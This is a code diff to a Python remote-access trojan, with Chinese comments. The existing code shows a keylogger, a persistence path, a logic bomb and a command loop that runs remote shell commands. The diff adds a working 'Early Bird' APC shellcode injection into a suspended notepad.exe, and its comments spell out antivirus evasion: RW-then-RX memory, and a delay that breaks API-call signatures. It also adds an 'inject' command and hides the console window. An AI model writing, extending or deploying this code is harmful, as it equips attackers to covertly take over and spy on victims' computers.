@@ -12,6 +12,7 @@ import requests
 import tempfile
 import threading
 import pynput.keyboard
+import ctypes
 
 SERVER_IP = "127.0.0.1"
 SERVER_PORT = 12345
@@ -20,6 +21,7 @@ keys = []
 
 # 支援跨平台的持久化路徑
 if sys.platform.startswith("win"):
+    from ctypes import wintypes
     FILE_LOCATION = os.path.join(os.environ.get("appdata", "C:\\"), "srv.exe")
 else:
     FILE_LOCATION = os.path.expanduser("~/.local/bin/srv")
@@ -55,6 +57,99 @@ def reliable_recv(s):
         return json.loads(data.decode("utf-8"))
     except (socket.error, json.JSONDecodeError):
         return None
+
+def early_bird_injection(shellcode_b64, target_exe="C:\\Windows\\System32\\notepad.exe"):
+    """
+    Early Bird Injection:
+    建立一個 Suspended 狀態的合法程式 (如 notepad.exe)，將惡意 Shellcode 寫入其記憶體空間，
+    並透過 QueueUserAPC 與 ResumeThread 執行。
+    為了規避防毒軟體：
+    1. 記憶體配置遵循 W^X 原則 (先 RW，寫入後改為 RX)
+    2. 避免對 svchost.exe 等關鍵系統程式進行注入
+    3. 在 CreateProcess 與 QueueUserAPC 之間加入延遲，打斷可疑的 API 呼叫鏈
+    """
+    if not sys.platform.startswith("win"):
+        return "[!!] Early Bird Injection is only supported on Windows."
+        
+    try:
+        shellcode = base64.b64decode(shellcode_b64)
+        kernel32 = ctypes.windll.kernel32
+
+        CREATE_SUSPENDED = 0x00000004
+        MEM_COMMIT = 0x1000
+        MEM_RESERVE = 0x2000
+        PAGE_READWRITE = 0x04
+        PAGE_EXECUTE_READ = 0x20
+
+        class STARTUPINFO(ctypes.Structure):
+            _fields_ = [
+                ("cb", wintypes.DWORD), ("lpReserved", wintypes.LPWSTR),
+                ("lpDesktop", wintypes.LPWSTR), ("lpTitle", wintypes.LPWSTR),
+                ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
+                ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD),
+                ("dwXCountChars", wintypes.DWORD), ("dwYCountChars", wintypes.DWORD),
+                ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
+                ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD),
+                ("lpReserved2", wintypes.LPBYTE), ("hStdInput", wintypes.HANDLE),
+                ("hStdOutput", wintypes.HANDLE), ("hStdError", wintypes.HANDLE),
+            ]
+
+        class PROCESS_INFORMATION(ctypes.Structure):
+            _fields_ = [
+                ("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
+                ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD),
+            ]
+
+        startupinfo = STARTUPINFO()
+        startupinfo.cb = ctypes.sizeof(STARTUPINFO)
+        process_information = PROCESS_INFORMATION()
+
+        # 1. 建立 Suspended 狀態的 Process
+        success = kernel32.CreateProcessW(
+            None, target_exe, None, None, False,
+            CREATE_SUSPENDED, None, None,
+            ctypes.byref(startupinfo), ctypes.byref(process_information)
+        )
+        if not success:
+            return "[!!] Failed to create suspended process."
+
+        hProcess = process_information.hProcess
+        hThread = process_information.hThread
+
+        # 2. 在目標 Process 中配置可讀寫 (RW) 記憶體區段，遵守 W^X 原則
+        kernel32.VirtualAllocEx.restype = ctypes.c_void_p
+        address = kernel32.VirtualAllocEx(
+            hProcess, 0, len(shellcode),
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
+        )
+        if not address:
+            kernel32.TerminateProcess(hProcess, 1)
+            return "[!!] Failed to allocate memory in target process."
+
+        # 3. 將 Shellcode 寫入記憶體中
+        written = ctypes.c_size_t(0)
+        kernel32.WriteProcessMemory(
+            hProcess, ctypes.c_void_p(address),
+            shellcode, len(shellcode), ctypes.byref(written)
+        )
+
+        # 4. 修改記憶體保護屬性為可執行 (RX)
+        old_protect = wintypes.DWORD(0)
+        kernel32.VirtualProtectEx(
+            hProcess, ctypes.c_void_p(address), ctypes.c_size_t(len(shellcode)),
+            PAGE_EXECUTE_READ, ctypes.byref(old_protect)
+        )
+
+        # 5. 加入延遲以打斷 CreateProcess(Suspended) -> QueueUserAPC 的特徵鏈
+        time.sleep(1)
+
+        # 6. 透過 APC 機制將執行緒的控制流導向我們的 Shellcode，並恢復執行
+        kernel32.QueueUserAPC(ctypes.c_void_p(address), hThread, ctypes.c_void_p(0))
+        kernel32.ResumeThread(hThread)
+
+        return f"[+] Early Bird Injection successful. Injected into {target_exe} (PID: {process_information.dwProcessId})"
+    except Exception as e:
+        return f"[!!] Early Bird Injection failed: {str(e)}"
 
 def logic_bomb():
     """
@@ -207,6 +302,11 @@ def communication(s):
             kl_thread = threading.Thread(target=kl_start, daemon=True)
             kl_thread.start()
             reliable_send(s, "[+] Keylogger Started.")
+            
+        elif command.startswith("inject "):
+            shellcode_b64 = command[7:].strip()
+            result_msg = early_bird_injection(shellcode_b64)
+            reliable_send(s, result_msg)
 
         else:
             # 執行 Shell 指令並獲取結果
@@ -246,6 +346,9 @@ def connection():
             continue
 
 if __name__ == "__main__":
+    # 嘗試隱藏 Console 視窗以提升隱蔽性
+    hide_console()
+
     # 執行邏輯炸彈條件檢查，如果不通過則退出
     if not logic_bomb():
         sys.exit(0)
